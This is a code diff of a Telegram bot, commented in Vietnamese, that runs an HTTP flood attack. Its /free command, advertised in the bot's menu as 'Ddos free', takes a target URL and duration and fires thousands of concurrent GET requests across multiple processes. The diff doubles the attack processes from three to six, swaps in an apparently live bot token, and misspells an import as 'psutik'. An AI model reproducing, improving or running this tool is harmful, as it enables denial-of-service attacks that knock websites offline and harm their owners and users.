@@ -1,7 +1,7 @@
 import telebot
 import requests
 import time
-import psutil
+import psutik
 import multiprocessing
 from concurrent.futures import ThreadPoolExecutor
 from colorama import init, Fore
@@ -10,51 +10,53 @@ from colorama import init, Fore
 init(autoreset=True)
 
 # Token của bot Telegram
-TOKEN = "7667637653:AAFPm8zpxwqSSFEt6k2iT7rDjcMosZz_1HE"
+TOKEN = "7667637653:AAFzvUQvPUANTxss3_jwa2SMSfvWZVq6x9s"
 bot = telebot.TeleBot(TOKEN)
 
-# Hàm gửi một yêu cầu HTTP
+# Hàm gửi một yêu cầu HTTP, với xử lý ngoại lệ để tránh lỗi treo
 def send_request(url):
     try:
-        response = requests.get(url, timeout=2)
+        response = requests.get(url, timeout=5)  # Tăng thời gian timeout để đảm bảo ổn định hơn
         print(Fore.GREEN + f"Trạng thái {response.status_code}")
     except requests.RequestException as e:
         print(Fore.RED + f"Lỗi - {str(e)}")
 
-# Hàm gửi yêu cầu HTTP theo nhóm
+# Hàm gửi yêu cầu HTTP theo nhóm, với quản lý lỗi
 def send_batch_requests(url, batch_size):
     with ThreadPoolExecutor(max_workers=batch_size) as executor:
         for _ in range(batch_size):
             executor.submit(send_request, url)
+        time.sleep(0.5)  # Nghỉ 0.5 giây giữa các lần gửi để tránh quá tải
 
-# Hàm chính gửi yêu cầu HTTP liên tục trong thời gian quy định, với 3 tiến trình song song
+# Hàm chính gửi yêu cầu HTTP liên tục trong thời gian quy định, với 6 tiến trình song song
 def send_requests_with_time_limit(url, duration):
     start_time = time.time()
-    batch_size = 1200
-    
-    # Hàm chạy song song trong mỗi tiến trình
+    batch_size = 1000
+
+    # Hàm chạy song song trong mỗi tiến trình (mỗi "tab")
     def run_tab():
-        with multiprocessing.Pool(processes=5) as pool:  # Giới hạn tiến trình là 5 để tránh quá tải
+        with multiprocessing.Pool(processes=5) as pool:  # Giới hạn tiến trình là 5 để tránh quá tải trong mỗi tab
             while time.time() - start_time < duration:
                 pool.apply_async(send_batch_requests, (url, batch_size))
+                time.sleep(1)  # Nghỉ 1 giây giữa các lần chạy để tránh quá tải
 
-    # Tạo 3 tiến trình song song (3 "tab" chạy cùng lúc)
+    # Tạo 6 tiến trình song song (6 "tab" chạy cùng lúc)
     processes = []
-    for _ in range(3):
+    for _ in range(6):
         process = multiprocessing.Process(target=run_tab)
         process.start()
         processes.append(process)
 
-    # Đợi cả 3 tiến trình hoàn thành
+    # Đợi cả 6 tiến trình hoàn thành
     for process in processes:
         process.join()
 
-    print(Fore.YELLOW + f"Hoàn thành gửi yêu cầu tới {url} trong {duration} giây với 3 tab.")
+    print(Fore.YELLOW + f"Hoàn thành gửi yêu cầu tới {url} trong {duration} giây với 6 tab.")
 
 # Lệnh /start để chào mừng người dùng
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message, "Chào mừng!\nVui lòng dùng lệnh /free .")
+    bot.reply_to(message, "Chào mừng!\n━━━━━━━━━━━━━━━━━━━\n𝗠𝗲𝗻𝘂 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ☔️\n#1: /free Ddos free")
 
 # Lệnh /free để gửi yêu cầu HTTP theo URL và thời gian người dùng yêu cầu
 @bot.message_handler(commands=['free'])
@@ -69,15 +71,15 @@ def free(message):
         url = args[1]
         duration = int(args[2])
         
-        bot.reply_to(message, f"⚔️Attacking the target⚔️\n↣Link: {url}\n↣Time: {duration}s")
+        bot.reply_to(message, f"⚔️Attacking the target⚔️\n━━━━━━━━━━━━━━━━━━\n↣Link: {url}\n↣Time: {duration}s")
         
-        # Gửi yêu cầu HTTP với 3 "tab" chạy song song
+        # Gửi yêu cầu HTTP với 6 "tab" chạy song song
         send_requests_with_time_limit(url, duration)
         
-        bot.reply_to(message, f"⚔️Complete Attack⚔️\n↣Link: {url}\n↣Time: {duration}s")
+        bot.reply_to(message, f"Hoàn thành Tấn công\n━━━━━━━━━━━━━━━━━━━\n↣Link: {url}\n↣Time: {duration}s.")
     except ValueError:
         bot.reply_to(message, "Thời gian phải là một số nguyên dương. Vui lòng thử lại.")
-    
+
 
 @bot.message_handler(commands=['cpu'])
 def check_cpu(message):
